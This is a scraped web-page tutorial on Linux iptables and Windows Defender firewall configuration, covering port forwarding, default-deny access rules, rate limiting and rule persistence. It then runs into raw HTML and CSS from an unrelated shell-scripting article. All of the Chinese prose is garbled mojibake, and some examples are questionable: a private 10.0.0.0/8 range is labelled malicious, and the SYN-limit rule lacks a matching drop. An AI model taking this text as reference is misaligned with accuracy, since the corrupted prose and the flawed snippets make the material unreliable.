<p>é˜²ç«å¢™é«˜çº§é…ç½®æ˜¯é€šè¿‡ç²¾ç»†åŒ–è§„åˆ™å®ç°ç½‘ç»œæµé‡çš„ç²¾å‡†ç®¡æ§ï¼Œæ ¸å¿ƒè¦†ç›–ä¸‰å¤§åœºæ™¯ï¼š<strong>ç«¯å£æ˜ å°„</strong>ï¼ˆå…¬ç½‘è®¿é—®å†…ç½‘æœåŠ¡ï¼‰ã€<strong>è®¿é—®æ§åˆ¶ç­–ç•¥</strong>ï¼ˆIP / ç«¯å£ / åè®®çº§æƒé™ç®¡æ§ï¼‰ã€<strong>iptables è§„åˆ™ç¼–å†™</strong>ï¼ˆLinux ç³»ç»Ÿåº•å±‚æµé‡è¿‡æ»¤ï¼‰ã€‚é€‚ç”¨äºæœåŠ¡å™¨è¿ç»´ã€ä¼ä¸šå†…ç½‘å®‰å…¨åŠ å›ºã€äº‘æœåŠ¡å™¨ç«¯å£ç®¡ç†ç­‰åœºæ™¯ï¼Œé…ç½®éµå¾ª â€œæœ€å°æƒé™åŸåˆ™â€ï¼Œå³ä»…å¼€æ”¾å¿…è¦æœåŠ¡ï¼Œæ‹’ç»æ‰€æœ‰é»˜è®¤æµé‡ã€‚</p>
<h3 data-id="heading-1">äºŒã€ç«¯å£æ˜ å°„é…ç½®ï¼ˆå…¬ç½‘è®¿é—®å†…ç½‘æœåŠ¡å®æ“ï¼‰</h3>
<p>ç«¯å£æ˜ å°„æœ¬è´¨æ˜¯å°†å…¬ç½‘ IP çš„æŒ‡å®šç«¯å£æµé‡ï¼Œè½¬å‘åˆ°å†…ç½‘æœåŠ¡å™¨çš„ç§æœ‰ IP + ç«¯å£ï¼Œå¸¸è§äº Web æœåŠ¡ã€æ¸¸æˆæœåŠ¡å™¨ã€è¿œç¨‹æ¡Œé¢ç­‰åœºæ™¯ã€‚</p>
<h4 data-id="heading-2">1. Linux ç³»ç»Ÿï¼ˆiptables å®ç°ï¼‰</h4>
<h5 data-id="heading-3">å‰ææ¡ä»¶</h5>
<ul>
<li>
<p>å·²å®‰è£… iptablesï¼ˆDebian/Ubuntuï¼š<code>sudo apt install iptables</code>ï¼›CentOSï¼š<code>sudo dnf install iptables</code>ï¼‰</p>
</li>
<li>
<p>æ‹¥æœ‰å…¬ç½‘ IPï¼ˆæœåŠ¡å™¨ç½‘å¡ç»‘å®šå…¬ç½‘åœ°å€ï¼‰</p>
</li>
<li>
<p>å†…ç½‘æœåŠ¡å™¨å¯æ­£å¸¸è®¿é—®</p>
</li>
</ul>
<h5 data-id="heading-4">é…ç½®æ­¥éª¤</h5>
<ol>
<li><strong>å¯ç”¨ IP è½¬å‘</strong>ï¼ˆå†…æ ¸çº§è½¬å‘å¼€å…³ï¼‰</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">sudo nano /etc/sysctl.conf
</code></pre>
<p>å–æ¶ˆæ³¨é‡Šæˆ–æ·»åŠ ï¼š<code>net.ipv4.ip_forward=1</code>ï¼Œæ‰§è¡Œç”Ÿæ•ˆï¼š</p>
<pre><code class="hljs language-css" lang="css">sudo sysctl -<span class="hljs-selector-tag">p</span>
</code></pre>
<ol>
<li><strong>é…ç½®ç«¯å£è½¬å‘è§„åˆ™</strong>ï¼ˆç¤ºä¾‹ï¼šå…¬ç½‘ 8080 ç«¯å£â†’å†…ç½‘ 192.168.1.100:80ï¼‰</li>
</ol>
<pre><code class="hljs language-css" lang="css">\# DNATï¼šç›®æ ‡åœ°å€è½¬æ¢ï¼ˆå…¬ç½‘â†’å†…ç½‘ï¼‰

sudo iptables -t nat -<span class="hljs-selector-tag">A</span> PREROUTING -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">8080</span> -j DNAT <span class="hljs-attr">--to-destination</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span>:<span class="hljs-number">80</span>

\# SNATï¼šæºåœ°å€è½¬æ¢ï¼ˆå†…ç½‘â†’å…¬ç½‘ï¼Œç¡®ä¿è¿”å›æµé‡æ­£å¸¸ï¼‰

sudo iptables -t nat -A POSTROUTING -j MASQUERADE
</code></pre>
<ol>
<li><strong>éªŒè¯ä¸ä¿å­˜</strong></li>
</ol>
<ul>
<li>
<p>æŸ¥çœ‹è§„åˆ™ï¼š<code>sudo iptables -t nat -L -n</code></p>
</li>
<li>
<p>æ°¸ä¹…ä¿å­˜ï¼ˆUbuntu/Debianï¼‰ï¼š</p>
</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">sudo apt install iptables-persistent  <span class="hljs-comment"># å®‰è£…æŒä¹…åŒ–å·¥å…·</span>

sudo netfilter-persistent save        <span class="hljs-comment"># ä¿å­˜è§„åˆ™åˆ°/etc/iptables/rules.v4</span>
</code></pre>
<ul>
<li>æ°¸ä¹…ä¿å­˜ï¼ˆCentOS/RHELï¼‰ï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">sudo service iptables save  <span class="hljs-comment"># è§„åˆ™ä¿å­˜åˆ°/etc/sysconfig/iptables</span>
</code></pre>
<h4 data-id="heading-5">2. Windows ç³»ç»Ÿï¼ˆWindows Defender é˜²ç«å¢™é«˜çº§é…ç½®ï¼‰</h4>
<p>é€‚ç”¨äº Windows Server æˆ–ä¸ªäººç”µè„‘ï¼Œé€šè¿‡å›¾å½¢åŒ–ç•Œé¢é…ç½®ç«¯å£æ˜ å°„ï¼š</p>
<ol>
<li>
<p>æ‰“å¼€ã€Œæ§åˆ¶é¢æ¿â†’ç³»ç»Ÿå’Œå®‰å…¨â†’Windows Defender é˜²ç«å¢™â†’é«˜çº§è®¾ç½®ã€</p>
</li>
<li>
<p>å³é”®ã€Œå…¥ç«™è§„åˆ™â†’æ–°å»ºè§„åˆ™ã€ï¼Œé€‰æ‹©ã€Œç«¯å£ã€ç±»å‹ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥</p>
</li>
<li>
<p>é€‰æ‹© TCP/UDP åè®®ï¼Œè¾“å…¥éœ€æ˜ å°„çš„æœ¬åœ°ç«¯å£ï¼ˆå¦‚ 8080ï¼‰ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥</p>
</li>
<li>
<p>é€‰æ‹©ã€Œå…è®¸è¿æ¥ã€ï¼Œé…ç½®é€‚ç”¨åœºæ™¯ï¼ˆåŸŸ / ä¸“ç”¨ / å…¬å…±ç½‘ç»œï¼‰</p>
</li>
<li>
<p>å‘½åè§„åˆ™ï¼ˆå¦‚ â€œWeb æœåŠ¡ 8080 ç«¯å£æ˜ å°„â€ï¼‰ï¼Œå®Œæˆåˆ›å»º</p>
</li>
<li>
<p>è¡¥å……é…ç½®ï¼šå³é”®è§„åˆ™â†’å±æ€§â†’é«˜çº§ï¼Œå‹¾é€‰ â€œåœ¨å…¬å…±ç½‘ç»œä¸Šå¯ç”¨â€ï¼ˆå…¬ç½‘è®¿é—®éœ€å¼€å¯ï¼‰</p>
</li>
</ol>
<h3 data-id="heading-6">ä¸‰ã€è®¿é—®æ§åˆ¶ç­–ç•¥è®¾è®¡ä¸å®ç°</h3>
<p>è®¿é—®æ§åˆ¶ç­–ç•¥æ˜¯é˜²ç«å¢™çš„æ ¸å¿ƒå®‰å…¨æœºåˆ¶ï¼Œé€šè¿‡ â€œå…è®¸ / æ‹’ç»â€ è§„åˆ™ç»„åˆï¼Œé™åˆ¶ç‰¹å®š IPã€ç«¯å£æˆ–åè®®çš„æµé‡ï¼Œåˆ†ä¸ºå…¥ç«™è§„åˆ™ï¼ˆå¤–éƒ¨â†’æœ¬åœ°ï¼‰å’Œå‡ºç«™è§„åˆ™ï¼ˆæœ¬åœ°â†’å¤–éƒ¨ï¼‰ã€‚</p>
<h4 data-id="heading-7">1. ç­–ç•¥è®¾è®¡ä¸‰åŸåˆ™</h4>
<ul>
<li>
<p>ä¼˜å…ˆçº§è§„åˆ™ï¼šè¶Šå…·ä½“çš„è§„åˆ™ä¼˜å…ˆçº§è¶Šé«˜ï¼ˆå¦‚ â€œå…è®¸ 192.168.1.0/24 è®¿é—® 80 ç«¯å£â€ ä¼˜å…ˆäº â€œå…è®¸æ‰€æœ‰ IP è®¿é—® 80 ç«¯å£â€ï¼‰</p>
</li>
<li>
<p>æ–¹å‘åŒºåˆ†ï¼šå…¥ç«™è§„åˆ™é‡ç‚¹é˜²å¤–éƒ¨æ”»å‡»ï¼Œå‡ºç«™è§„åˆ™é™åˆ¶å†…éƒ¨è¿è§„è®¿é—®ï¼ˆå¦‚ç¦æ­¢è®¿é—®æ¶æ„ IPï¼‰</p>
</li>
<li>
<p>æ—¥å¿—å®¡è®¡ï¼šå¼€å¯æ—¥å¿—è®°å½•ï¼Œä¾¿äºæ’æŸ¥å¼‚å¸¸æµé‡ï¼ˆè®°å½•ä¸¢å¼ƒåŒ…å’ŒæˆåŠŸè¿æ¥ï¼‰</p>
</li>
</ul>
<h4 data-id="heading-8">2. å®æ“æ¡ˆä¾‹ï¼ˆLinux+Windowsï¼‰</h4>
<h5 data-id="heading-9">æ¡ˆä¾‹ 1ï¼šLinux iptables è®¿é—®æ§åˆ¶ï¼ˆæœ€å¸¸ç”¨ï¼‰</h5>
<pre><code class="hljs language-css" lang="css">\# <span class="hljs-number">1</span>. è®¾ç½®é»˜è®¤ç­–ç•¥ï¼ˆæ‹’ç»æ‰€æœ‰å…¥ç«™/è½¬å‘ï¼Œå…è®¸å‡ºç«™ï¼‰

sudo iptables -<span class="hljs-selector-tag">P</span> <span class="hljs-selector-tag">INPUT</span> DROP

sudo iptables -<span class="hljs-selector-tag">P</span> FORWARD DROP

sudo iptables -<span class="hljs-selector-tag">P</span> OUTPUT ACCEPT

\# <span class="hljs-number">2</span>. å…è®¸ä¿¡ä»»IPè®¿é—®SSHï¼ˆ<span class="hljs-number">22</span>ç«¯å£ï¼‰

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">22</span> -j ACCEPT

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s <span class="hljs-number">123.45</span>.<span class="hljs-number">67.89</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">22</span> -j ACCEPT

\# <span class="hljs-number">3</span>. ç¦æ­¢ç‰¹å®šIPæ®µè®¿é—®ï¼ˆå¦‚æ¶æ„IPæ®µ<span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">8</span>ï¼‰

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">8</span> -j DROP

\# <span class="hljs-number">4</span>. å…è®¸HTTPï¼ˆ<span class="hljs-number">80</span>ï¼‰å’ŒHTTPSï¼ˆ<span class="hljs-number">443</span>ï¼‰ç«¯å£å…¬å…±è®¿é—®

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">80</span> -j ACCEPT

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">443</span> -j ACCEPT

\# <span class="hljs-number">5</span>. å¯ç”¨æ—¥å¿—è®°å½•ï¼ˆè®°å½•è¢«æ‹’ç»çš„è¿æ¥ï¼‰

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -j LOG <span class="hljs-attr">--log-prefix</span> "FIREWALL-DENY: <span class="hljs-string">"
</span></code></pre>
<h5 data-id="heading-10">æ¡ˆä¾‹ 2ï¼šWindows Defender è®¿é—®æ§åˆ¶ç­–ç•¥</h5>
<ol>
<li>
<p>æ‰“å¼€é«˜çº§é˜²ç«å¢™â†’ã€Œå‡ºç«™è§„åˆ™â†’æ–°å»ºè§„åˆ™ã€ï¼Œé€‰æ‹©ã€Œè‡ªå®šä¹‰ã€ç±»å‹</p>
</li>
<li>
<p>åŒ¹é…æ¡ä»¶è®¾ç½®ï¼š</p>
</li>
</ol>
<ul>
<li>
<p>åè®®ï¼šTCP/UDPï¼ˆå¯æŒ‡å®šå…·ä½“åè®®å·ï¼‰</p>
</li>
<li>
<p>è¿œç¨‹ IP åœ°å€ï¼šæ·»åŠ éœ€ç¦æ­¢çš„ IP æ®µï¼ˆå¦‚ 192.168.2.0/24ï¼‰</p>
</li>
<li>
<p>æœ¬åœ°ç«¯å£ï¼šé™åˆ¶ç‰¹å®šç«¯å£ï¼ˆå¦‚ç¦æ­¢è®¿é—® 3389 è¿œç¨‹æ¡Œé¢ç«¯å£ï¼‰</p>
</li>
</ul>
<ol>
<li>
<p>æ“ä½œé€‰æ‹©ã€Œé˜»æ­¢è¿æ¥ã€ï¼Œé€‚ç”¨ç½‘ç»œåœºæ™¯é€‰æ‹©ã€Œæ‰€æœ‰ç½‘ç»œã€</p>
</li>
<li>
<p>å‘½åè§„åˆ™ï¼ˆå¦‚ â€œç¦æ­¢è®¿é—®è¿è§„ IP æ®µâ€ï¼‰ï¼Œå®Œæˆé…ç½®</p>
</li>
</ol>
<h3 data-id="heading-11">å››ã€iptables è§„åˆ™ç¼–å†™è¿›é˜¶ï¼ˆLinux ç³»ç»Ÿï¼‰</h3>
<p>iptables æ˜¯ Linux å†…æ ¸è‡ªå¸¦çš„é˜²ç«å¢™å·¥å…·ï¼Œé€šè¿‡ â€œé“¾ + è§„åˆ™â€ æœºåˆ¶è¿‡æ»¤æµé‡ï¼Œæ ¸å¿ƒé“¾åŒ…æ‹¬ INPUTï¼ˆå…¥ç«™ï¼‰ã€OUTPUTï¼ˆå‡ºç«™ï¼‰ã€FORWARDï¼ˆè½¬å‘ï¼‰ï¼Œæ”¯æŒ IPã€ç«¯å£ã€åè®®ã€è¿æ¥çŠ¶æ€ç­‰å¤šç»´åº¦åŒ¹é…ã€‚</p>
<h4 data-id="heading-12">1. åŸºç¡€è¯­æ³•æ ¼å¼</h4>
<pre><code class="hljs language-css" lang="css">iptables \<span class="hljs-selector-attr">[-t è¡¨å]</span> åŠ¨ä½œ é“¾å åŒ¹é…æ¡ä»¶ -j ç›®æ ‡åŠ¨ä½œ
</code></pre>
<ul>
<li>
<p>è¡¨åï¼šé»˜è®¤ filter è¡¨ï¼ˆè¿‡æ»¤ï¼‰ï¼Œnat è¡¨ï¼ˆåœ°å€è½¬æ¢ï¼‰ï¼Œmangle è¡¨ï¼ˆæµé‡ä¿®æ”¹ï¼‰</p>
</li>
<li>
<p>åŠ¨ä½œï¼š-Aï¼ˆè¿½åŠ è§„åˆ™ï¼‰ã€-Iï¼ˆæ’å…¥è§„åˆ™ï¼‰ã€-Dï¼ˆåˆ é™¤è§„åˆ™ï¼‰ã€-Fï¼ˆæ¸…ç©ºè§„åˆ™ï¼‰</p>
</li>
<li>
<p>åŒ¹é…æ¡ä»¶ï¼š-sï¼ˆæº IPï¼‰ã€-dï¼ˆç›®æ ‡ IPï¼‰ã€-pï¼ˆåè®®ï¼‰ã€--dportï¼ˆç›®æ ‡ç«¯å£ï¼‰ã€--sportï¼ˆæºç«¯å£ï¼‰</p>
</li>
<li>
<p>ç›®æ ‡åŠ¨ä½œï¼šACCEPTï¼ˆå…è®¸ï¼‰ã€DROPï¼ˆä¸¢å¼ƒï¼‰ã€REJECTï¼ˆæ‹’ç»å¹¶è¿”å›ä¿¡æ¯ï¼‰ã€LOGï¼ˆæ—¥å¿—ï¼‰</p>
</li>
</ul>
<h4 data-id="heading-13">2. é«˜é¢‘è§„åˆ™å®ä¾‹ï¼ˆç›´æ¥å¤åˆ¶å¯ç”¨ï¼‰</h4>
<h5 data-id="heading-14">ï¼ˆ1ï¼‰è¿æ¥çŠ¶æ€åŒ¹é…ï¼ˆä»…å…è®¸å·²å»ºç«‹çš„è¿æ¥ï¼‰</h5>
<pre><code class="hljs language-css" lang="css">\# å…è®¸ESTABLISHEDï¼ˆå·²å»ºç«‹ï¼‰å’ŒRELATEDï¼ˆå…³è”è¿æ¥ï¼‰æµé‡

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -m state <span class="hljs-attr">--state</span> ESTABLISHED,RELATED -j ACCEPT
</code></pre>
<h5 data-id="heading-15">ï¼ˆ2ï¼‰ç«¯å£èŒƒå›´é™åˆ¶ï¼ˆå…è®¸ 1000-2000 ç«¯å£è®¿é—®ï¼‰</h5>
<pre><code class="hljs language-css" lang="css">sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">1000</span>:<span class="hljs-number">2000</span> -j ACCEPT
</code></pre>
<h5 data-id="heading-16">ï¼ˆ3ï¼‰SYN Flood æ”»å‡»é˜²æŠ¤ï¼ˆé™åˆ¶æ¯ç§’æ–°å»ºè¿æ¥æ•°ï¼‰</h5>
<pre><code class="hljs language-css" lang="css">sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--syn</span> -m limit <span class="hljs-attr">--limit</span> <span class="hljs-number">1</span>/s -j ACCEPT
</code></pre>
<h5 data-id="heading-17">ï¼ˆ4ï¼‰åˆ é™¤æŒ‡å®šè§„åˆ™ï¼ˆåˆ é™¤ INPUT é“¾ä¸­å…è®¸ 80 ç«¯å£çš„è§„åˆ™ï¼‰</h5>
<pre><code class="hljs language-arduino" lang="arduino">\# å…ˆæŸ¥çœ‹è§„åˆ™ç¼–å·ï¼šsudo iptables -L <span class="hljs-literal">INPUT</span> --line-numbers

sudo iptables -D <span class="hljs-literal">INPUT</span> <span class="hljs-number">3</span>  # <span class="hljs-number">3</span>ä¸ºè§„åˆ™ç¼–å·
</code></pre>
<h4 data-id="heading-18">3. è§„åˆ™ç®¡ç†æ ¸å¿ƒæŠ€å·§</h4>
<ul>
<li>
<p>å¤‡ä»½è§„åˆ™ï¼š<code>sudo iptables-save &gt; /root/iptables_backup.rules</code></p>
</li>
<li>
<p>æ¢å¤è§„åˆ™ï¼š<code>sudo iptables-restore &lt; /root/iptables_backup.rules</code></p>
</li>
<li>
<p>å¼€æœºè‡ªå¯ï¼ˆSystemd ç³»ç»Ÿï¼‰ï¼š</p>
</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">\<span class="hljs-comment"># åˆ›å»ºæœåŠ¡æ–‡ä»¶</span>

sudo nano /etc/systemd/system/iptables-restore.service
</code></pre>
<p>å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">\<span class="hljs-section">[Unit]</span>

<span class="hljs-attr">Description</span>=Restore iptables rules

<span class="hljs-attr">After</span>=network.target

\<span class="hljs-section">[Service]</span>

<span class="hljs-attr">Type</span>=<span class="hljs-literal">on</span>eshot

<span class="hljs-attr">ExecStart</span>=/sbin/iptables-restore /etc/iptables/rules.v4

\<span class="hljs-section">[Install]</span>

<span class="hljs-attr">WantedBy</span>=multi-user.target
</code></pre>
<p>å¯ç”¨æœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo systemctl daemon-reload

sudo systemctl <span class="hljs-built_in">enable</span> iptables-restore
</code></pre>
<h3 data-id="heading-19">äº”ã€é¿å‘æŒ‡å—ä¸å¸¸è§é—®é¢˜æ’æŸ¥</h3>
<ol>
<li><strong>ç«¯å£æ˜ å°„é…ç½®åæ— æ³•è®¿é—®ï¼Ÿ</strong></li>
</ol>
<ul>
<li>
<p>æ£€æŸ¥å†…æ ¸ IP è½¬å‘æ˜¯å¦å¯ç”¨ï¼š<code>sysctl net.ipv4.ip_forward</code>ï¼ˆè¿”å› 1 ä¸ºæ­£å¸¸ï¼‰</p>
</li>
<li>
<p>äº‘æœåŠ¡å™¨éœ€å¼€æ”¾å®‰å…¨ç»„ï¼ˆå¦‚é˜¿é‡Œäº‘ ECSã€è…¾è®¯äº‘éœ€åœ¨æ§åˆ¶å°æ”¾è¡Œå¯¹åº”ç«¯å£ï¼‰</p>
</li>
<li>
<p>æœ¬åœ°é˜²ç«å¢™æ˜¯å¦æ‹¦æˆªï¼š<code>sudo iptables -L INPUT -n | grep 8080</code>ï¼ˆæŸ¥çœ‹è§„åˆ™æ˜¯å¦å­˜åœ¨ï¼‰</p>
</li>
</ul>
<ol>
<li><strong>iptables è§„åˆ™é‡å¯åå¤±æ•ˆï¼Ÿ</strong></li>
</ol>
<ul>
<li>
<p>æœªæ‰§è¡Œæ°¸ä¹…ä¿å­˜å‘½ä»¤ï¼ˆéœ€æŒ‰ Linux å‘è¡Œç‰ˆé€‰æ‹©å¯¹åº”æ–¹æ³•ï¼‰</p>
</li>
<li>
<p>CentOS 7 + é»˜è®¤ä½¿ç”¨ firewalldï¼Œéœ€å…ˆå…³é—­ï¼š<code>sudo systemctl stop firewalld &amp;&amp; sudo systemctl disable firewalld</code></p>
</li>
</ul>
<ol>
<li><strong>è®¿é—®æ§åˆ¶ç­–ç•¥ä¸ç”Ÿæ•ˆï¼Ÿ</strong></li>
</ol>
<ul>
<li>
<p>è§„åˆ™ä¼˜å…ˆçº§é¡ºåºé”™è¯¯ï¼šå…ˆæ·»åŠ å…·ä½“è§„åˆ™ï¼Œå†æ·»åŠ é€šç”¨è§„åˆ™</p>
</li>
<li>
<p>æœªè®¾ç½®é»˜è®¤æ‹’ç»ç­–ç•¥ï¼š<code>iptables -P INPUT DROP</code>ï¼ˆå¦åˆ™é»˜è®¤å…è®¸æ‰€æœ‰æµé‡ï¼‰</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Shellè„šæœ¬åŸºç¡€æ•™ç¨‹ï¼šå˜é‡ã€æ¡ä»¶åˆ¤æ–­ã€å¾ªç¯ã€å‡½æ•°å®æˆ˜ï¼ˆé™„æ¡ˆä¾‹ï¼‰]]></title>    <link>https://juejin.cn/post/7576978338754723890</link>    <guid>https://juejin.cn/post/7576978338754723890</guid>    <pubDate>2025-11-27T06:24:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576978338754723890" data-draft-id="7577016562251808819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Shellè„šæœ¬åŸºç¡€æ•™ç¨‹ï¼šå˜é‡ã€æ¡ä»¶åˆ¤æ–­ã€å¾ªç¯ã€å‡½æ•°å®æˆ˜ï¼ˆé™„æ¡ˆä¾‹ï¼‰"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-11-27T06:24:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸Šç­æ—¥å¸¸æ‘¸é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/1197792767524060"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Shellè„šæœ¬åŸºç¡€æ•™ç¨‹ï¼šå˜é‡ã€æ¡ä»¶åˆ¤æ–­ã€å¾ªç¯ã€å‡½æ•°å®æˆ˜ï¼ˆé™„æ¡ˆä¾‹ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1197792767524060/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸Šç­æ—¥å¸¸æ‘¸é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:24:44.000Z" title="Thu Nov 27 2025 06:24:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 